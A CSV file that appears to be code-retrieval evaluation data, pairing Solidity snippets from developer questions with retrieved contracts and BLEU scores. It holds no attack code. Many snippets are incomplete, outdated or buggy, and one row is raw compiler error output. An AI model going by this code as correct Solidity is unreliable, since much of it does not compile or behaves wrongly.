sni,bleu,code
"contract MyContract {

        bytes32  public custName;
        bytes32  public custLoc;
        address public docAddress = this;

        function MyContract () {

            custName = ""0xDEFAULT"";
            custLoc  = ""0xDEFAULT"";

        }

        event LogNewCust (address _address, bytes32 _custName, bytes32 _custLoc);

        function AssignAttributes (bytes32 _custName, bytes32 _custLoc)  
            returns (bool isSuccess) {

            custName    = _custName;
            custLoc     = _custLoc;

            LogNewCust(docAddress,custName,custLoc);

            return true;

        }

    }",0.5767607125020265,"contract ComponentListInterface {

    event ComponentUpdated (bytes32 _name, string _version, address _componentAddress);

    function setComponent(bytes32 _name, address _componentAddress) public returns (bool);

    function getComponent(bytes32 _name, string _version) public view returns (address);

    function getLatestComponent(bytes32 _name) public view returns(address);

    function getLatestComponents(bytes32[] _names) public view returns(address[]);

}"
"contract Random_number is usingOraclize {
  string public randomNumber;

  function Create_random_number() {
    oraclize_setNetwork(networkID_testnet);
    oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
    oraclize_query(""WolframAlpha"", ""random number between 0 and 100"");
  }

  function __callback(bytes32 myid, string result, bytes proof) {
    if (msg.sender != oraclize_cbAddress()) throw;
    randomNumber = result;
  }
}",0.5062648071140703,"contract Database {

    address public owner;

    constructor() public {
      owner = msg.sender;
    }
    
    function withdraw() public {
      require(msg.sender == owner);
      owner.transfer(address(this).balance);
    }

    
    
    event Table(uint256 indexed _row, bytes32 indexed _column, bytes32 indexed _value);
    

    function put(uint256 _row, string _column, string _value) public {
        emit Table(_row, keccak256(_column), keccak256(_value));
    }
}"
"contract Store{
  address private owner;
  mapping(string=>Product) productDetails;
  mapping(string=>Order) orderDetail;
  struct Product{
      string description;
      uint price;
  }
  struct Order{
      string deliveryAddress;
      uint phone;
  }

  constructor(address creator) public {
    owner = creator;
  }

  modifier restricted(){
      require(msg.sender==owner);
      _;
  }

   using HitchensUnorderedKeySetLib for HitchensUnorderedKeySetLib.Set;
    HitchensUnorderedKeySetLib.Set products;
    HitchensUnorderedKeySetLib.Set orders;

    event StoreUpdate(address sender, string action, bytes32 key);
    event OrderUpdate(address sender, string action, bytes32 key);

    function addProductToStore(bytes32 product) public restricted {
        products.insert(product);
        emit StoreUpdate(msg.sender, ""insert"", product);
    }

    function addOrders(bytes32 order) public {
        orders.insert(order);
        emit OrderUpdate(msg.sender, ""insert"", order);
    }

    function removeProductToTheStore(bytes32 product) public restricted {
        products.remove(product);
        emit StoreUpdate(msg.sender, ""remove"", product);
    }

      function removeOrder(bytes32 order) public restricted {
        orders.remove(order);
        emit OrderUpdate(msg.sender, ""remove"", order);
    }

    function countProducts() public view returns(uint) {
         return products.count();
    }

    function countOrders() public restricted view returns(uint) {
         return orders.count();
    }


    function getProducts(uint index) public view returns(bytes32 ) {
        return products.keyList[index];
    }

    function getOrders (uint index) public view returns(bytes32 ) {
    return orders.keyList[index];
    }

}",0.5769573277143109,"contract UnlimitedAllowanceToken is IERC20 {

  using SafeMath for uint256;



  



  uint256 public totalSupply;

  mapping (address => uint256) public  balances;

  mapping (address => mapping (address => uint256)) public allowed;



  



  event Approval(address indexed src, address indexed spender, uint256 amount);

  event Transfer(address indexed src, address indexed dest, uint256 amount);



  



  constructor () public { }



  



  function approve(address _spender, uint256 _amount) public returns (bool) {

    allowed[msg.sender][_spender] = _amount;

    emit Approval(msg.sender, _spender, _amount);

    return true;

  }



  function transfer(address _dest, uint256 _amount) public returns (bool) {

    return transferFrom(msg.sender, _dest, _amount);

  }



  function transferFrom(address _src, address _dest, uint256 _amount) public returns (bool) {

    require(balances[_src] >= _amount, ""Insufficient user balance"");



    if (_src != msg.sender && allowance(_src, msg.sender) != uint256(-1)) {

      require(allowance(_src, msg.sender) >= _amount, ""Insufficient user allowance"");

      allowed[_src][msg.sender] = allowed[_src][msg.sender].sub(_amount);

    }



    balances[_src] = balances[_src].sub(_amount);

    balances[_dest] = balances[_dest].add(_amount);



    emit Transfer(_src, _dest, _amount);



    return true;

  }



  function allowance(address _owner, address _spender) public view returns (uint256) {

    return allowed[_owner][_spender];

  }



  function balanceOf(address _owner) public view returns (uint256) {

    return balances[_owner];

  }



  function totalSupply() public view returns (uint256) {

    return totalSupply;

  }

}"
"contract RefundableCrowdsale {
  uint256 cap;

  RefundableCrowdsale (uint256 _cap) {
    cap = _cap;
  }
}",0.5113558892226576,"contract Trader {

    function buy(address _from, uint256 _tokenId, uint256 _count) public;

}"
"contract MyCrowdsale is RefundableCrowdsale {

  
  function MyCrowdsale (cap) RefundableCrowdsale (
    ethToWeiConverter(cap)
  ) {
    ...
  }

  function ethToWeiConverter(uint256 eths) returns (uint256) {
    return eths * 10**18
  }
}",0.5345866454607805,"contract SkillMarketplace is Upgradable {

    function sellToken(uint256, uint256) external;

    function removeFromAuction(uint256) external;

    function getAuction(uint256) external view returns (uint256);

}"
"contract Election {
^ (Relevant source part starts here and spans across multiple lines).

/C/Users/asus/election/contracts/Election.sol:1:1: SyntaxError: Source file requires different compiler version (current compiler is 0.5.0+commit.1d4f565a.Emscripten.clang - note that nightly builds are considered to be strictly less than the released version
pragma solidity 0.4.24;
^---------------------^

/C/Users/asus/election/contracts/Election.sol:24:5: SyntaxError: 
Functions are not allowed to have the same name as the contract. If you intend this to be a constructor, use ""constructor(...) { ... }"" to define it.
function Election () public {
^ (Relevant source part starts here and spans across multiple lines).

/C/Users/asus/election/contracts/Migrations.sol:1:1: SyntaxError: Source file requires different compiler version (current compiler is 0.5.0+commit.1d4f565a.Emscripten.clang - note that nightly builds are considered to be strictly less than the released version
pragma solidity ^0.4.24;
^----------------------^

,/C/Users/asus/election/contracts/Election.sol:24:5: Warning: This declaration shadows an existing declaration.
function Election () public {
^ (Relevant source part starts here and spans across multiple lines).

/C/Users/asus/election/contracts/Election.sol:3:1: The shadowed declaration is here:
contract Election {
^ (Relevant source part starts here and spans across multiple lines).

/C/Users/asus/election/contracts/Election.sol:29:28: TypeError: Data location must be ""storage"" or ""memory"" for parameter in function, but none was given.
function addCandidate (string _name) private {
                       ^----------^
Compilation failed. See above.
Truffle v5.0.1 (core: 5.0.1)
Node v11.6.0
",0.5266495515724817,"contract Notes is Token {

    

    
    uint256 public constant nFund = 80 * (10**6) * 10**decimals;

    
    string public constant name = ""NOTES"";
    string public constant symbol = ""NTS"";
    uint256 public constant decimals = 18;
    string public version = ""1.0"";

    

    address admin;
    bool public activated = false;
    mapping (address => bool) public activeGroup;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) allowed;

    

    modifier active()
    {
      require(activated || activeGroup[msg.sender]);
      _;
    }

    modifier onlyAdmin()
    {
      require(msg.sender == admin);
      _;
    }

    

    function Notes(address fund)
    {
      admin = msg.sender;
      totalSupply = nFund;
      balances[fund] = nFund;    
      activeGroup[fund] = true;  
    }

    

    function addToActiveGroup(address a) onlyAdmin {
      activeGroup[a] = true;
    }

    function activate() onlyAdmin {
      activated = true;
    }

    

    function transfer(address _to, uint256 _value) active returns (bool success) {
      if (balances[msg.sender] >= _value && _value > 0) {
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
      } else {
        return false;
      }
    }

    function transferFrom(address _from, address _to, uint256 _value) active returns (bool success) {
      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
        return true;
      } else {
        return false;
      }
    }

    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) active returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }

}"
"contract NonPayloadAttackableToken {
    modifier onlyPayloadSize(uint size) { 
          assert(msg.data.length >= size + 4);
      _;    
}
function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) {
     
}",0.5633211285006494,"contract NEToken {
  function balanceOf(address _owner) constant returns (uint256 balance);
  function transfer(address _to, uint256 _value) returns (bool success);
}"
"contract Test {

    mapping (uint => bool[40]) public grid;

    function check(uint x, uint y, uint size) public {

        for(uint i = 0; i < size; i++) {
            for(uint j = 0; j < size; j++) {

                if(grid[x + i][y + j]) {
                    
                    revert();
                }

                grid[x + i][y + j] = true;

            }
        }
    }

}",0.5684424039931242,"contract Math {

    function add(uint x, uint y) internal pure returns (uint z) {

        require((z = x + y) >= x, ""add overflow"");

    }

    

    function sub(uint x, uint y) internal pure returns(uint z) {

        require((z = x - y) <= x, ""sub underflow"");

    }

}"
"contract C {
    function f(uint a, uint b) constant returns (uint[]) {
        assembly {
            
            let memOffset := mload(0x40) 
            mstore(memOffset, 0x20) 
            mstore(add(memOffset, 32), 2) 
            mstore(add(memOffset, 64), a) 
            mstore(add(memOffset, 96), b) 
            return(memOffset, 128)
        }
    }
}",0.5193316863489945,"contract InterestRateModel {



    

    function getSupplyRate(address asset, uint cash, uint borrows) public view returns (uint, uint);



    

    function getBorrowRate(address asset, uint cash, uint borrows) public view returns (uint, uint);

}"
"contract SimpleStore {

  uint public BetRound;
  uint public SelectedUser;

  struct Struct {
    uint _round;
    address _owner;
    uint _index;
    bool _active;
  }

  mapping(uint => Struct) public userIndexStruct;
  uint[] public userArray;

  function add(address _address) public {
    Struct storage accounts = userIndexStruct[userArray.length];
    accounts._round = BetRound+ 1;
    accounts._owner = _address;
    accounts._active = true;
    accounts._index = userArray.length;

    userArray.push(accounts._index);
  }

  function update(uint _index) public {
    userIndexStruct[_index]._round++;
  }

  function SetUsers() public returns (uint) {
      
      
      
      if(SelectedUser >= userArray.length ) {
          BetRound++;
          SelectedUser = 0;
      }

        for (uint i = SelectedUser; i < userArray.length; i++) {

          if (userIndexStruct[i]._round < BetRound) {
            if (userIndexStruct[i]._active) {
                
                
                update(i);
                SelectedUser = i;
                
                return i;
            }
          }
        }

        
        BetRound++;
  }

}",0.5931529319860004,"contract Twitter {

  struct User {
    string name;
    string[] messages;
  }
  
  mapping (address => User) users;
  
  address[] history;
  
  function changeName(string name) public {
    users[msg.sender].name = name;
  }
  
  function getName(address user) public view returns(string name) {
    return users[user].name;
  }

  function postMessage(string text) public {
    users[msg.sender].messages.push(text);
    history.push(msg.sender);
  }
  
  function getMessage(address user, uint index) public constant returns(string value) {
    return users[user].messages[index];
  }

  function countMessages(address user) public constant returns(uint length) {
    return users[user].messages.length;
  }
  
  function getHistory(uint index) public constant returns(address user) {
    return history[index];
  }
  
  function countHistory() public constant returns(uint length) {
    return history.length;
  }
}"
"contract CampaignFactory {
    Campaign[] public deployedCampaigns;

    function createCampaign(string memory campaignName) public payable {
        Campaign newCampaign = (new Campaign).value(msg.value)(msg.sender, campaignName);
        deployedCampaigns.push(newCampaign);
    }

    function getCampaigns() public view returns (Campaign[] memory) {
        return deployedCampaigns;
    }

    
    function getActiveCampaigns() public view returns (Campaign[] memory) {
        
    }
}",0.5561435630583564,"contract TID_TOKEN is ERC20 {
	string private _name = ""Tridac"";
    	string private _symbol = ""TID"";
    	uint8 private _decimals = 8;
        	
	constructor() public {
	    _mint(msg.sender, 7000000000000000);
	}

	
    	function name() public view returns (string memory) {
      	    return _name;
    	}

	
	function symbol() public view returns (string memory) {
	    return _symbol;
	}

        
	function decimals() public view returns (uint8) {
	  return _decimals;
	}
}"
"contract Campaign {
    address public campaignManager; 
    string public campaignName;
    bool public campaignActive; 
...",0.5771401245076446,"contract TokenInterface is ERC20 {

  string public name;

  string public symbol;

  uint public decimals;

}"
"contract Caller {

    Called public called_address;

    function set_address(address _addy) {
        called_address = Called(_addy);
    }

    function set(uint256 _var) {
        called_address.set(_var);
    } 

    function set_call(address _called, uint256 _var) {
        require(_called.call(bytes4(sha3(""set(uint256)"")), _var));
    }
}",0.5962966649563388,"contract ICalled is IOwned {

    

    function callers(address) public pure returns (bool) { }



    function appendCaller(address _caller) public;  

    function removeCaller(address _caller) public;  

    

    event AppendCaller(ICaller _caller);

    event RemoveCaller(ICaller _caller);

}"
"contract Sandbox {

  struct Leader {
    address host;
    uint fitness;
  }

  Leader[] public myList;

  function append(uint value) public {
    Leader memory leader = Leader(msg.sender, value);
    myList.push(leader);
  }

}",0.5900904947128356,"contract locaToken {

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function allowance(address _owner, address _spender) public view returns (uint);

}"
"contract PersonContract {

    using MyLib for MyLib.PersonsData ;

    MyLib.PersonsData mypersons  ;

    function PersonContract() payable { 
        mypersons.MyLibInit() ;
    }

    function () {
        revert() ; 
    }

    function AddPerson()  payable public {
        mypersons.AddPerson() ; 
    }

}",0.5238037145579173,"contract HasNoEther is Ownable {

  address thisContract = this;

  
  function HasNoEther() public payable {
    require(msg.value == 0);
  }

  
  function() external {
  }

  
  function reclaimEther() external onlyOwner {
    assert(owner.send(thisContract.balance));
  }
}"
"contract MarkAttendance {

struct AttendeeDetails {
    address attendance_giver;
    address attendee;
    uint attendance_opinion;
    uint256 timestamp;
    uint256 date_of_attendance;
}


mapping(uint => AttendeeDetails) public attendeeDetails;
uint public attendeeDetailsCount;

function markAttendance(address _attendee, uint _attendance_opinion, uint256 _date) public {
    attendeeDetailsCount ++;
    attendeeDetails[attendeeDetailsCount] = AttendeeDetails(msg.sender, _attendee, _attendance_opinion, now, _date);
    }
}",0.5227194031455608,"contract CSToken is owned {uint8 public decimals;

	uint[] public agingTimes;

	address[] public addressByIndex;

	function balanceOf(address _owner) constant returns (uint256 balance);

	function mintToken(address target, uint256 mintedAmount, uint agingTime);

	function addAgingTime(uint time);

	function allAgingTimesAdded();

	function addAgingTimesForPool(address poolAddress, uint agingTime);

	function countAddresses() constant returns (uint256 length);
}"
"contract Test {

    struct S {
        string s;
        uint u;
    }

    function returnTwoValues() private returns (string s, uint u) {
        s = ""123"";
        u = 123;
    }

    constructor() {
        S memory s = S(returnTwoValues());
    }
}",0.5764151932166176,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract B is A {

    string greeting;
    function B(string _greeting) { greeting = _greeting; }

}",0.5334402958540256,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract greeter is mortal {
    
    string greeting;

    
    function greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }

    function updateGreet(string _greeting) public payable returns(bool) {
        greeting = _greeting;
        return true;
    } 
}",0.5823470633889697,"contract ERC721Metadata is ERC721Basic {
  
  
  
  bytes4 constant INTERFACE_ERC721_METADATA = 0x5b5e139f;

  function name() public view returns (string _name);
  function symbol() public view returns (string _symbol);
  function tokenURI(uint256 _tokenId) public view returns (string);
}"
"contract GiftRegistry {

  uint256 idCounter = 0;
  enum GiftStatus { Offered }

  struct Gift {
    string description;
    uint256 value;
    GiftStatus status;
    address giftGiver;
    address giftReceiver;
    address giftApprover;
  }

  mapping(uint256 => Gift) public giftMap;

  function doesGiftExist(uint256 _giftId) private view returns(bool){
    Gift memory gift = giftMap[_giftId];
    bytes memory giftAsBytes = bytes(gift.description);

    return giftAsBytes.length > 0;
  }

  function getGift(uint256 _giftId) public view returns(string memory, uint256, GiftStatus, address, address, address){
    require(doesGiftExist(_giftId), 'Gift not found');
    Gift memory gift = giftMap[_giftId];

    return (
      gift.description,
      gift.value,
      gift.status,
      gift.giftGiver,
      gift.giftReceiver,
      gift.giftApprover
    );
  }

  function offerGift(string memory _description, uint256 _value, address _giftReceiver) public returns(uint256) {
    uint256 currentId = idCounter;
    giftMap[currentId] = Gift(_description, _value, GiftStatus.Offered, msg.sender, _giftReceiver, address(0));

    idCounter = idCounter + 1;

    return currentId;
  }
}",0.5712104690866335,"contract SSC_HowManyPeoplePaid {
 
    event Bought(address _address);
    event PriceUpdated(uint256 _price);
 
    
    address private _owner;
 
    
    uint256 private _count = 0;
    
    uint256 private _price = 1500000000000000;
    
    
    mapping (address => bool) _clients;
    
    constructor() public {
        _owner = msg.sender;   
    }
    
   function withdraw() public{
        require(msg.sender == _owner);
        _owner.transfer(address(this).balance);
    }
    
    
    
    function() public payable { }
    
    function buy() public payable {
        
        assert(msg.value >= _price);
        
        
        if (!_clients[msg.sender]) {
            _clients[msg.sender] = true;
            _count += 1;
        }
        
        
        emit Bought(msg.sender);
    }
    
    
    
    function setPrice(uint256 newPrice) public {
        require(msg.sender == _owner);
        assert(newPrice > 0);
        
        
        _price = newPrice;
        
        
        emit PriceUpdated(newPrice);
    }
    
    
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getPrice() public view returns (uint256) {
        return _price;
    }
    
    
    
    
    function getCount() public view returns (bool, uint256) {
        if(_clients[msg.sender]){
            return (true,_count);    
        }
        return (false, 0);
    }
    
    function isClient(address _address) public view returns (bool) {
        return _clients[_address];
    }
}"
"contract TestB {
    B testB;
    A testA;

    function beforeEach() {
        A = A(DeployedAddresses.A());
        B = testA.createB(""test"");
    }

    function testOwnerIsSet() {
        Assert.equal(address(A), address(B), ""Owner's address does not match"");
    }
}",0.5261485200055015,"contract MultiSender {
    function multiSend(uint256 amount, address[] addresses) public returns (bool) {
        for (uint i = 0; i < addresses.length; i++) {
            addresses[i].transfer(amount);
        }
    }

    function () public payable {
        
    }
}"
"contract Voting {
    
    
    
    event AddedCandidate(uint candidateID);

    
    struct Voter {
        bytes32 uid; 
        uint candidateIDVote;
    }
    
    struct Candidate {
        bytes32 name;
        bytes32 party; 
        
        
        bool doesExist; 
    }

    
    
    uint numCandidates; 
    uint numVoters;

    
    
    
    
    
    mapping (uint => Candidate) candidates;
    mapping (uint => Voter) voters;
    
    

    function addCandidate(bytes32 name, bytes32 party) public {
        
        uint candidateID = numCandidates++;
        
        candidates[candidateID] = Candidate(name,party,true);
        AddedCandidate(candidateID);
    }

    function vote(bytes32 uid, uint candidateID) public {
        
        if (candidates[candidateID].doesExist == true) {
            uint voterID = numVoters++; 
            voters[voterID] = Voter(uid,candidateID);
        }
    }

    
    

    
    
    function totalVotes(uint candidateID) view public returns (uint) {
        uint numOfVotes = 0; 
        for (uint i = 0; i < numVoters; i++) {
            
            if (voters[i].candidateIDVote == candidateID) {
                numOfVotes++;
            }
        }
        return numOfVotes; 
    }

    function getNumOfCandidates() public view returns(uint) {
        return numCandidates;
    }

    function getNumOfVoters() public view returns(uint) {
        return numVoters;
    }
    
    function getCandidate(uint candidateID) public view returns (uint,bytes32, bytes32) {
        return (candidateID,candidates[candidateID].name,candidates[candidateID].party);
    }
}",0.5374174441357419,"contract EtherCard {

  struct Gift {
      uint256 amount;
      uint256 amountToRedeem;
      bool redeemed;
      address from;
  }
  
  
  address public owner;
  mapping (bytes32 => Gift) gifts;
  uint256 feeAmount;

  function EtherCard() public {
    owner = msg.sender;
    feeAmount = 100; 
  }

  function getBalance() public view returns (uint256) {
      return this.balance;
  }

  function getAmountByCoupon(bytes32 hash) public view returns (uint256) {
      return gifts[hash].amountToRedeem;
  }

  function getRedemptionStatus(bytes32 hash) public view returns (bool) {
      return gifts[hash].redeemed;
  }

  
  function redeemGift(string coupon, address wallet) public returns (uint256) {
      bytes32 hash = keccak256(coupon);
      Gift storage gift = gifts[hash];
      if ((gift.amount <= 0) || gift.redeemed) {
          return 0;
      }
      uint256 amount = gift.amountToRedeem;
      wallet.transfer(amount);
      gift.redeemed = true;
      return amount;
  }

  
  function createGift(bytes32 hashedCoupon) public payable {
        if (msg.value * 1000 < 1) { 
            return;
        }
        uint256 calculatedFees = msg.value/feeAmount;
        
        var gift = gifts[hashedCoupon];
        gift.amount = msg.value;
        gift.amountToRedeem = msg.value - calculatedFees;
        gift.from = msg.sender;
        gift.redeemed = false;

        
        owner.transfer(calculatedFees);                
  }
}"
"contract CollegeAdmin {
uint public studentAge=18;
event changedAge(uint age);
function setAge(uint age) public { 
studentAge = age;
changedAge(age);
}
}",0.5570747013013061,"contract LiquidPledging {
    function confirmPayment(uint64 idPledge, uint amount) public;
    function cancelPayment(uint64 idPledge, uint amount) public;
}"
"contract Applications {

  address applicant;

  mapping(uint => string) Application;

  function Applications() internal {
    applicant = msg.sender;
  } 

  modifier ifApplicant() {
    if (applicant != msg.sender) {
      revert();
    } else {
      _;
    }
  }

  function setApplication(uint id, string data) public {
    Application[id] = data;
  }

  function getApplication(uint id) ifApplicant public view returns (string) {
     return Application[id];
  }
}",0.5738996415295421,"contract DigitalPrintImage {

	struct ImageMetadata {

        uint finalSeed;

        bytes32[] potentialAssets;

        uint timestamp;

        address creator;

        string ipfsHash;

        string extraData;

    }



    mapping(uint => ImageMetadata) public imageMetadata;



	function totalSupply() public view returns (uint256);

	function getImageMetadata(uint _imageId) public view

    	returns(address, string, uint, string, uint, bytes32[]);

}"
"contract Test {
    event Event(address indexed wallet);

    mapping (address => bool) public authorizedWallets;

    uint256 public authorizedWalletCount;

    function add(address _wallet) external {
        _add(_wallet);
        emit Event(_wallet);
    }

    function _add(address _wallet) private {
        require(!authorizedWallets[_wallet]);
        authorizedWallets[_wallet] = true;
        authorizedWalletCount++;
    }
}",0.5582433497321353,"contract Freezable {



  event Frozen(address indexed _account);

  event Unfrozen(address indexed _account);



  mapping (address => bool) public frozenAccounts;



  

  function Freezable() public { }



  

  modifier notFrozen {

    require(!frozenAccounts[msg.sender]);

    _;

  }





  function isFrozen(address account) public view returns (bool) {

    return frozenAccounts[account];

  }

}"
"contract A {
  B b;

  constructor(address _B) {
    b = new interfaceB(_B);
  }

  function availableFunction() {
    b.protectedFunc();
  }
}",0.5708451125777922,"contract SaiTapInterface {
    function sai() public view returns (address);
    function cash(uint256) public;
}"
"contract Oracle {
  struct Request {
    bytes data;
    function(bytes memory) external callback;
  }
  Request[] requests;
  event NewRequest(uint);
  function query(bytes data, function(bytes memory) external callback) {
    requests.push(Request(data, callback));
    NewRequest(requests.length - 1);
  }
  function reply(uint requestID, bytes response) {
    
    requests[requestID].callback(response);
  }
}",0.5352770846774665,"contract DSProxyInterface {

    function execute(bytes memory _code, bytes memory _data) public payable returns (address, bytes32);



    function execute(address _target, bytes memory _data) public payable returns (bytes32);



    function setCache(address _cacheAddr) public payable returns (bool);



    function owner() public returns (address);

}"
"contract OracleUser {
  Oracle constant oracle = Oracle(0x1234567); 
  function buySomething() {
    oracle.query(""USD"", this.oracleResponse);
  }
  function oracleResponse(bytes response) {
    require(msg.sender == address(oracle));
    
  }
}",0.5249181162431066,"contract CoinbaseTest {

    address owner;

    

    constructor() public {

        owner = msg.sender;

    }

    

    function () public payable {

    }

    

    function withdraw() public {

        require(msg.sender == owner);

        msg.sender.transfer(this.balance);

    }



}"
"contract A is Owned{ 
  B b;
  function A() { 
    b = new B(); 
  }
}",0.5423752619931431,"contract IOwned {
	function owner() public pure returns (address) {}
}"
"contract Asset {

    address public owner;
    struct Asset {
        string title;
        string description;
        uint  assetTime;
        uint price;
    }

    Asset[] public  assets;

    event LogAssetAdded(address indexed fromAddress, string description);

    
    function addAsset(string  description1, string title1, uint price1,uint assetTime1) 
      returns (uint, string, string, uint, uint) {
        uint assetID = assets.length++;
        Asset o = assets[assetID];

        o.description = description1;
        o.assetTime=assetTime1;
        o.title = title1;
        o.price = price1;

        LogAssetAdded(msg.sender, description1);

        return (assetID, assets[assetID].description, assets[assetID].title, assets[assetID].price, 
          assets[assetID].assetTime);
    }

    
    function assetCount() public constant returns(uint) {
        uint assetCount =assets.length;
        return(assetCount);
    }

    function getAssetPrice(uint assetID) public constant returns(uint) {
        return assets[assetID].price;
    }

    function getDefAssetPrice() public constant returns(uint) {
        return assets[assets.length-1].price;
    }

    function getDefAssetTitle() public constant returns(string) {
        return assets[assets.length-1].title;
    }

    function getDefAssetTime() public constant returns(uint) {
        return assets[assets.length-1].assetTime;
    }
}",0.5796276407624785,"contract tokenCreator is Ownable{



    string internal _symbol;

    string internal _name;

    uint8 internal _decimals;

    uint internal _totalSupply = 500000000;

    mapping (address => uint256) internal _balanceOf;

    mapping (address => mapping (address => uint256)) internal _allowed;



    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = _calcTokens(decimals,totalSupply);

    }



   function _calcTokens(uint256 decimals, uint256 amount) internal pure returns (uint256){

      uint256 c = amount * 10**decimals;

      return c;

   }



    function name() public constant returns (string) {

        return _name;

    }



    function symbol() public constant returns (string) {

        return _symbol;

    }



    function decimals() public constant returns (uint8) {

        return _decimals;

    }



    function totalSupply() public constant returns (uint) {

        return _totalSupply;

    }



    function balanceOf(address _addr) public constant returns (uint);

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
"contract UserRecord {
  address public owner;
  bytes32[] public Servicelist;

  constructor () public {
    owner = msg.sender;
    newService(""1"",""Serviceone"",msg.sender);
  }

  struct Service {
    address serviceowner;
    string servicename;
    bytes serviceid;
    bool isService;
  }

  mapping(bytes32 => Service) public servicestructs;

  function isService(bytes32 uid) public view returns(bool isIndeed) {
    return servicestructs[uid].isService;
  }

  function getServiceCount() public view returns(uint count) {
    return Servicelist.length;
  }

  function newService(bytes32 uid, string memory _servicename, address _serviceowner) public returns(bool success) {
    require(!isService(uid));
    servicestructs[uid].servicename = _servicename;
    servicestructs[uid].serviceowner = _serviceowner;
    servicestructs[uid].isService = true;
    Servicelist.push(uid);
    emit LognewService(owner, uid, _servicename, _serviceowner);
    return true;
  }

  function getService(string memory servicequery) public view returns(bool) {
    for(uint i=0;i<Servicelist.length;i++) {
      Service storage service=Servicelist[i];
      string memory service_name=Servicelist[i].servicename;
      if(keccak256(abi.encodePacked(service_name))==keccak256(abi.encodePacked(service_name))) {
        return service_name;
      }
    }
  } 

  event LognewService(address sender, bytes32 hash, string servicename, address serviceowner);
}",0.5453513602393767,"contract OurERC20 {



  using SafeMath for uint256;

  string _name;

  string _symbol;

  mapping (address => uint256) _balances;

  uint256 _totalSupply;

  uint8 private _decimals;

  event Transfer(address indexed from, address indexed to, uint tokens);

  

  constructor() public {

    _name = ""HOLA"";

    _symbol = ""HL"";

    _decimals = 0;

  }

  

  function decimals() public view returns(uint8) {

      return _decimals;

  }

  

  function totalSupply() public view returns (uint256) {

      return _totalSupply;

  }

  

  function name() public view returns (string memory) {

     return _name;

  }

  

  function symbol() public view returns (string memory) {

     return _symbol;

  }

  

  function mint(uint256 amount) public payable {

      require(msg.value == amount.mul(0.006 ether));

      _balances[msg.sender] = _balances[msg.sender].add(amount);

      _totalSupply = _totalSupply + amount;

  }

  

  function burn(uint256 amount) public {

      require(_balances[msg.sender] == amount);

      _balances[msg.sender] = _balances[msg.sender].sub(amount);

      msg.sender.transfer(amount.mul(0.006 ether));

      _totalSupply = _totalSupply - amount;

  }

  

  function transfer(address _to, uint256 value) public returns (bool success) {

      require(_balances[msg.sender] >= value);

      _balances[msg.sender] = _balances[msg.sender].sub(value);

      _balances[_to] = _balances[_to].add(value);

      emit Transfer(msg.sender, _to, value);      

      return true;

  }

  

  

  

  

  

  

}"
"contract Rental {
    struct PaidRent {
        uint id;
        uint value;
    }
    event RentPaid(bool Status);
    PaidRent[] public paidrents;
    function payRent(uint _rent) public payable returns(bool status) {
        owner.send(_rent);
        paidrents.push(PaidRent({
            id : paidrents.length + 1,
            value : _rent
        }));
        RentPaid(true);
        return true;
    }
}",0.5707233255229308,"contract ERC223Interface {
    function transfer(address _to, uint _value) public returns (bool success);
    function transfer(address _to, uint _value, bytes _data) public returns (bool success);
    event ERC223Transfer(address indexed _from, address indexed _to, uint _value, bytes _data);
}"
"contract myContract {
    foreignContract created;

    function myContract() {
        created = foreignContract(msg.sender);
    }

    function changeNameMycontract(string name) returns(bool, address) {
        return (created.changeName(name), msg.sender);    
    }

    function ReturnName()returns(string) {
        return created.receiveName();
    }
}",0.5327062814111899,"contract Hash {
    
    address owner;

    
    function Hash() public {
        owner = msg.sender;
    }

    
    function() internal {
        revert();
    }

    function hash(string dataString) public pure returns(bytes32){
        return(keccak256(dataString));
    }

    function selfDestruct() public {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}"
"contract Proof { 
    function register(bytes32 hash) { 
        if (hashToDate[hash] != 0) return; 
        hashToDate[hash] = now; 

    } 
    function dateOf(bytes32 hash) constant returns (uint date) { 
        return hashToDate[hash]; 

    } 
    mapping (bytes32 => uint) hashToDate; 
}",0.5735530150491688,"contract Dates {
    uint constant DAY_IN_SECONDS = 86400;

    function getNow() public view returns(uint) {
        return now;
    }

    function getDelta(uint _date) public view returns(uint) {
        
        return (now / DAY_IN_SECONDS) - (_date / DAY_IN_SECONDS);
    }
}"
"contract B is A {
    function doSmth() {
        super.doSmth();
        
    }
}",0.558024933102482,"contract OBOK 

{

    function donateDivs() public payable;

}"
"contract Test1 {

   struct Car {
       string carCreationDate;
       string carOrigin;
       address carOwner;
   }

   mapping(uint => Car) public CarStruct;

   function setNewCar(string memory _carCreationDate, string memory _carOrigin, address _carOwner) public returns(uint) {
       uint carId = uint(keccak256(abi.encodePacked(msg.sender, now)));
       CarStruct[carId].carCreationDate = _carCreationDate;
       CarStruct[carId].carOrigin = _carOrigin;
       CarStruct[carId].carOwner = _carOwner;
       return carId;
   }
}",0.5607330529591025,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract Foo {
    uint256 public x;
    MyContract myContract;
    address myContractAddress;

